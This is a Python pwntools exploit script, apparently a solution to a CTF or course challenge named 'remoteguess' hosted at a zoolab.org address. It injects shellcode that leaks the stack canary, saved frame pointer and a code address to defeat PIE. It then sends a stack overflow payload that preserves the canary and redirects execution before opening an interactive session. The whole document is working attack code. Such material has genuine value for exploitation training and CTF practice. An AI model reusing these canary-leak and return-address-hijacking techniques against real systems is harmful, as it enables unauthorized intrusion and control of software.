#!/usr/bin/env python3
import os
import sys
from pwn import *

exe = context.binary = ELF('./remoteguess')

if args.REMOTE:
    io = remote("up23.zoolab.org", 10816)
    sys.path.insert(0, os.path.normpath(os.path.join(__file__, '../../../pow')))
    __import__('pow').solve_pow(io)
else:
    io = process(exe.path)
    pause()

payload = asm('''
push rbp
mov rbx, qword ptr fs:[0x28]
push rbx
mov rdx, 24
mov rsi, rsp
mov rdi, 1
mov rax, 1
syscall
mov rdi, 0
mov rax, 60
syscall
''')

io.sendlineafter(b'send to me? ', str(len(payload)).encode())
io.sendlineafter(b'to call? ', b'0')
io.sendafter(b'bytes): ', payload)

io.readuntil(b'.\n')
canary = u64(io.read(8))
info(f'canary: {hex(canary)}')
rbp = u64(io.read(8))
info(f'rbp: {hex(rbp)}')
exe.address = u64(io.read(8)) - exe.sym.main - 739
info(f'exe base: {hex(exe.address)}')

payload = flat({
    0: b'0\n',
    0x18: [
        canary,
        rbp,
        exe.sym.main + 910,
        0,
        0,
        0,
        0,
    ]
})
io.sendline(payload)

io.interactive()
